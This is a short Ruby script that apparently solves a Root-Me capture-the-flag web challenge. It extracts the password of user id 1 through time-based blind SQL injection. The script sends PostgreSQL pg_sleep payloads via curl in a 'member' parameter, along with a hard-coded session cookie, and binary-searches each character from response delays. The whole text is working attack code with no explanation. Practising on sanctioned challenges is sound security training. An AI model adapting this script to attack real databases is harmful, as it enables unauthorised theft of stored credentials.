allChars = ('!'..'~').to_a
pass = ""
url = "http://challenge01.root-me.org/web-serveur/ch40/"
13.times do |i|
  charset = allChars
  while charset.length > 1
    curr = (charset.length - 1) / 2
    char = charset[curr]
    puts "Password(#{i}/13): #{pass}, Testing: #{char}(#{char.ord})"

    injection = "action=member&member=1;select case when "
    injection += "ascii(substr(password,#{pass.length+1},1))>#{char.ord} "
    injection += "then pg_sleep(10) else pg_sleep(0) end from users where id=1--"

    start_time = Time.now
    req = `curl '#{url}?#{injection}' -H 'Cookie: PHPSESSID=qscevnc0cqdj68daqcqrkvvpb4; uid=wKgbZFzuZa+PRTr8Dw2qAg=='`
    total_time = Time.now - start_time

    if total_time > 2
      charset = charset[(curr+1)..-1]
    else
      charset = charset[0..curr]
    end
    system('clear')
  end
  pass += charset[0]
end

puts "Password: #{pass}"
